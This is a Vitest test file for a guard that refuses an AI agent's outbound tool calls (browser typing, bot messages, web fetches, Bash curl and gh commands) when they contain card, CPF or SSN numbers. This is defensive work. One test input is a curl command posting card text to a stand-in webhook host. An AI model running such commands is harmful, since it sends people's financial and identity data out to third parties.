import { describe, expect, it } from 'vitest';

import { findSensitiveOutboundRefusal } from './guardOutboundCall.ts';

const CARD_TEXT = 'Use 4111 1111 1111 1111 please';
const CPF_TEXT = 'CPF 529.982.247-25';

describe('findSensitiveOutboundRefusal', () => {
    it.each([
        ['mcp__cloudbot__browser_type', { text: CARD_TEXT }, 'payment card number'],
        ['mcp__cloudbot__desktop_type', { text: CARD_TEXT }, 'payment card number'],
        ['mcp__cloudbot__bot_send', { bot: 'Ana', text: CARD_TEXT }, 'payment card number'],
        ['mcp__cloudbot__integration_run', { name: 'sync', args: [CPF_TEXT] }, 'Brazilian CPF number'],
        ['mcp__cloudbot__browser_open', { url: 'https://shop.example/?card=4111111111111111' }, 'payment card number'],
        ['WebFetch', { url: 'https://example.com/?ssn=078-05-1120', prompt: 'read' }, 'US Social Security number'],
        ['mcp__postgres__query', { sql: `select * from orders where note = '${CPF_TEXT}'` }, 'Brazilian CPF number'],
        ['Bash', { command: `curl -d "${CARD_TEXT}" https://hooks.example.com` }, 'payment card number'],
        ['Bash', { command: `gh issue comment 1 --body "${CARD_TEXT}"` }, 'payment card number'],
        ['Bash', { command: `gh api -X POST repos/a/b/issues -f body="${CARD_TEXT}"` }, 'payment card number'],
    ])('refuses %s that holds a number', (toolName, toolInput, label) => {
        const refusal = findSensitiveOutboundRefusal(toolName, toolInput);

        expect(refusal)
            .toContain(label);
    });

    it('never repeats the number in the refusal', () => {
        const refusal = findSensitiveOutboundRefusal('mcp__cloudbot__browser_type', { text: CARD_TEXT });

        expect(refusal)
            .not.toContain('4111');
        expect(refusal)
            .toContain('request_secret');
    });

    it.each([
        ['mcp__cloudbot__browser_type', { text: 'Hello there' }],
        ['Bash', { command: `echo "${CARD_TEXT}"` }],
        ['Bash', { command: 'gh issue view 1' }],
        ['Read', { file_path: 'notes.txt', note: CARD_TEXT }],
        ['mcp__cloudbot__request_secret', { name: 'CARD', purpose: CARD_TEXT, site: 'https://shop.example' }],
        ['mcp__cloudbot__channel_list', { note: CARD_TEXT }],
    ])('lets %s through when it is not an outbound call or holds no number', (toolName, toolInput) => {
        expect(findSensitiveOutboundRefusal(toolName, toolInput))
            .toBeUndefined();
    });

    it('treats an outside connector as outbound, whatever its name', () => {
        const refusal = findSensitiveOutboundRefusal('mcp__mail__list_messages', { query: CARD_TEXT });

        expect(refusal)
            .toContain('payment card number');
    });
});

describe('outbound tools added with the number guard', () => {
    it.each([
        ['WebSearch', { query: `shop ${CARD_TEXT}` }, 'payment card number'],
        ['mcp__cloudbot__watch_create', { url: 'https://shop.example/?card=4111111111111111', keyword: 'sale' }, 'payment card number'],
        ['mcp__cloudbot__bot_create', { name: 'Ana', description: CPF_TEXT }, 'Brazilian CPF number'],
        ['mcp__cloudbot__routine_create', { prompt: `Send ${CARD_TEXT} every day` }, 'payment card number'],
    ])('refuses %s that holds a number', (toolName, toolInput, label) => {
        expect(findSensitiveOutboundRefusal(toolName, toolInput))
            .toContain(label);
    });

    it('lets a web search without a number through', () => {
        expect(findSensitiveOutboundRefusal('WebSearch', { query: 'best coffee in Curitiba' }))
            .toBeUndefined();
    });
});
